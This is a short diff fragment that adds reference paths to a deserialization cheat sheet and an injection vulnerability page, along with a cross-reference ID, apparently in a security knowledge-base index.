+  - sources/repos/CheatSheetSeries/cheatsheets/Deserialization_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+  see:
+  - WEB-DESER-001
